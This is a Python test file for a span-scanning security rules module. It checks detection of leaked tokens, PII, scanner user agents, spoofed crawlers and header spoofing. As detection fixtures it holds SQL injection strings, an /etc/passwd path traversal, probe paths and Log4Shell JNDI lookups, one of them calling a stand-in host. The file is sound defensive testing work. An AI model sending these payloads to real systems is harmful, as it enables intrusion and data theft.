from __future__ import annotations

from ddctl.security_rules import (
    cdn_of,
    cidr_concentration,
    classify_user_agent,
    client_ip_from_xff,
    group_findings,
    header_findings,
    is_spoofed_crawler,
    redact_url,
    scan_span,
    span_view,
)

JWT = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"


def _span(url=None, **custom):
    http = dict(custom.pop("http", {}))
    if url:
        http["url"] = url
    return {"attributes": {"service": "web", "resource_name": "GET /x", "span_id": "s1", "trace_id": "t1",
                           "custom": {"http": http, **custom}}}


def rules(span):
    return sorted({f["rule"] for f in scan_span(span)})


def test_secret_in_url_is_redacted() -> None:
    findings = scan_span(_span(f"https://shop.example/reset?token={JWT}&x=1"))
    assert [f["rule"] for f in findings] == ["secret_in_url"]  # reported once, not also as JWT tag
    ev = findings[0]["evidence"]
    assert JWT not in ev and "eyJ…(" in ev and "&x=1" in ev


def test_already_obfuscated_values_are_not_leaks() -> None:
    assert rules(_span("https://shop.example/reset?token=REDACTED&Reset=REDACTED")) == []


def test_session_id_in_url() -> None:
    assert rules(_span("https://obe.example/room/?subSessionId=01HXYZABCDEF")) == ["session_id_in_url"]
    assert "***" in redact_url("https://a.example/forms/lservlet;jsessionid=ABCDEF123456")


def test_injection_payloads() -> None:
    assert "injection_sqli" in rules(_span("https://a.example/api/reviews?pageSize=1%20AND%20SLEEP(5)"))
    assert "injection_sqli" in rules(_span("https://a.example/api?id=1 UNION ALL SELECT null,null"))
    assert "injection_traversal" in rules(_span("https://a.example/static/../../../../etc/passwd"))
    assert "injection_jndi" in rules(_span("https://a.example/?q=${jndi:ldap://x.example/a}"))
    assert rules(_span("https://a.example/select-room?id=3")) == []


def test_probe_paths_skip_health_endpoints() -> None:
    assert rules(_span("https://a.example/actuator/health")) == []
    assert rules(_span("https://a.example/actuator/prometheus")) == []
    assert rules(_span("https://a.example/actuator/env")) == ["scanner_probe_path"]
    assert rules(_span("https://a.example/.git/config")) == ["scanner_probe_path"]


def test_pii_rules() -> None:
    assert rules(_span("https://a.example/img/cover@2x.png")) == []
    assert rules(_span("https://a.example/u?email=jane.doe@example.com")) == ["pii_in_url"]
    assert rules(_span("https://a.example/pay?pan=4111111111111111")) == ["pii_in_url"]


def test_cleartext_only_for_external_client_calls() -> None:
    ext = _span("http://api.partner.example/v1", **{"span": {"kind": "client"}})
    ext["attributes"]["custom"]["http"]["url_details"] = {"scheme": "http", "host": "api.partner.example"}
    assert rules(ext) == ["cleartext_http_external"]
    internal = _span("http://users.default.svc.cluster.local/v1", **{"span": {"kind": "client"}})
    internal["attributes"]["custom"]["http"]["url_details"] = {"scheme": "http", "host": "users.default.svc.cluster.local"}
    assert rules(internal) == []


def test_user_agent_classification() -> None:
    assert classify_user_agent("sqlmap/1.7.2#stable")[0] == "scanner"
    assert classify_user_agent("Mozilla/5.0 (X11) HeadlessChrome/119.0")[0] == "headless"
    assert classify_user_agent("Mozilla/5.0 (compatible; GPTBot/1.0)")[0] == "ai_crawler"
    assert classify_user_agent("node")[0] == "http_library"
    assert classify_user_agent("")[0] == "empty"
    assert classify_user_agent(
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
    ) == ("browser", "Chrome")


def test_spoofed_crawler() -> None:
    assert is_spoofed_crawler("Googlebot/2.1", "Alibaba US Technology") == "Googlebot"
    assert is_spoofed_crawler("Googlebot/2.1", "Google LLC") is None
    assert is_spoofed_crawler("Googlebot/2.1", "Akamai International B.V.") is None  # behind CDN: unknown


def test_xff_and_cdn() -> None:
    assert cdn_of("2.16.1.54") == "akamai" and cdn_of("81.2.69.160") is None
    assert client_ip_from_xff('["81.2.69.160, 23.45.1.1, 172.23.1.2"]') == "81.2.69.160"
    assert client_ip_from_xff("10.0.0.1, 2.16.1.1") is None


def test_header_findings_xff_spoofing_and_payloads() -> None:
    v = span_view(_span("https://a.example/", http={"request": {"headers": {
        "x-forwarded-for": "127.0.0.1, 81.2.69.160",
        "user-agent": "${jndi:ldap://evil.example/a}",
    }}}))
    got = {f["rule"] for f in header_findings(v)}
    assert {"xff_spoofing", "malicious_header"} <= got


def test_cidr_concentration_and_grouping() -> None:
    ips = {f"104.164.{i}.{j}": 1 for i in range(10) for j in range(3)}
    ips["8.8.8.8"] = 500
    groups = cidr_concentration(ips, min_ips=20)
    assert groups[0]["prefix"] == "104.164.0.0/16" and groups[0]["ips"] == 30
    f = {"rule": "r", "severity": "high", "service": "s", "resource": "x", "field": "f", "span_id": "a"}
    out = group_findings([f, {**f, "span_id": "b"}, {**f, "span_id": "c"}])
    assert len(out) == 1 and out[0]["occurrences"] == 3 and out[0]["sample_span_ids"] == ["a", "b", "c"]
